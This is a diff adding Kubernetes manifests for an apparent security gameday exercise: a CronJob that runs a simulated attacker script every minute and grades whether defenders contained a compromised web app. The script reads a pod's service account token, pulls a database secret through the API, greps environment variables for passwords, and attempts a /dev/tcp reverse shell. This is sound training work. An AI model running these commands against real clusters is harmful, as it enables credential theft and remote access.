@@ -1,0 +1,114 @@
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: attacker-runner
+  namespace: gameday
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: attacker-runner-role
+  namespace: gameday
+rules:
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["get", "list"]
+  - apiGroups: [""]
+    resources: ["pods/exec"]
+    verbs: ["create"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: attacker-runner-binding
+  namespace: gameday
+subjects:
+  - kind: ServiceAccount
+    name: attacker-runner
+    namespace: gameday
+roleRef:
+  kind: Role
+  name: attacker-runner-role
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: webshell-attack-script
+  namespace: gameday
+data:
+  run.sh: |
+    #!/bin/sh
+    # 判定は3段階:
+    #   1) Podが見つからない          -> 完全ブロック(ワークロードを止めた/入れ替えた = 本当の封じ込め)
+    #   2) Podはあるが SECRET_ACCESS=DENIED -> 部分ブロック(RBACは直ったが、シェル自体は塞げていない)
+    #   3) SECRET_ACCESS=GRANTED      -> 突破継続(何も直っていない)
+    # kubectl execの終了コードには依存しない(以前は末尾の`; true`で常に成功扱いになるバグがあった)。
+    POD=$(kubectl get pod -n gameday -l app=vulnerable-webapp -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
+    if [ -z "$POD" ]; then
+      echo "[attacker] BLOCKED: vulnerable-webapp not found (workload stopped/replaced) - team has contained the incident"
+      exit 0
+    fi
+    echo "[attacker] exploited RCE on vulnerable-webapp, target pod: $POD"
+    OUTPUT=$(kubectl exec -n gameday "$POD" -- /bin/sh -c '
+      echo "[attacker] shell acquired inside vulnerable-webapp";
+      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);
+      echo "[attacker] read service account token";
+      if curl -sf --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/gameday/secrets/db-credentials; then
+        echo "[attacker] SECRET_ACCESS=GRANTED";
+      else
+        echo "[attacker] SECRET_ACCESS=DENIED";
+      fi;
+      echo "[attacker] dumping environment variables for additional credentials";
+      env | grep -i -E "PASSWORD|SECRET|USERNAME";
+      echo "[attacker] running recon tool for lateral movement";
+      cp /bin/true /tmp/nmap;
+      /tmp/nmap -sV kubernetes.default.svc 2>/dev/null;
+      echo "[attacker] opening reverse shell to blend in with normal traffic";
+      timeout 3 bash -c "bash -i >& /dev/tcp/kubernetes.default.svc/443 0>&1" 2>/dev/null;
+      true
+    ' 2>&1)
+    echo "$OUTPUT"
+    if echo "$OUTPUT" | grep -q "SECRET_ACCESS=GRANTED"; then
+      echo "[attacker] SUCCEEDED: secret exfiltrated (RBAC not yet fixed)"
+    else
+      echo "[attacker] PARTIAL BLOCK: RBAC fix worked (secret access denied), but the pod is still compromised - shell/reverse-shell still ran. Stop or replace the workload for full containment."
+    fi
+---
+# Wave1発火(fire_wave1.sh)でこのCronJobをapplyすると、Sysdig接続前から1分おきに
+# 攻撃試行が継続する。封じ込め(vulnerable-webapp停止)とRBAC修正が効くと、以降の実行は
+# 自然にBLOCKEDへ切り替わり、それ自体がWave2(防御持続)の証明になる。
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: webshell-attack-loop
+  namespace: gameday
+  labels:
+    gameday: attack
+spec:
+  schedule: "*/1 * * * *"
+  concurrencyPolicy: Forbid
+  successfulJobsHistoryLimit: 5
+  failedJobsHistoryLimit: 5
+  jobTemplate:
+    spec:
+      backoffLimit: 0
+      template:
+        metadata:
+          labels:
+            gameday: attack
+        spec:
+          restartPolicy: Never
+          serviceAccountName: attacker-runner
+          containers:
+            - name: attacker
+              image: bitnami/kubectl:latest
+              command: ["/bin/sh", "/scripts/run.sh"]
+              volumeMounts:
+                - name: script
+                  mountPath: /scripts
+          volumes:
+            - name: script
+              configMap:
+                name: webshell-attack-script
+                defaultMode: 0755
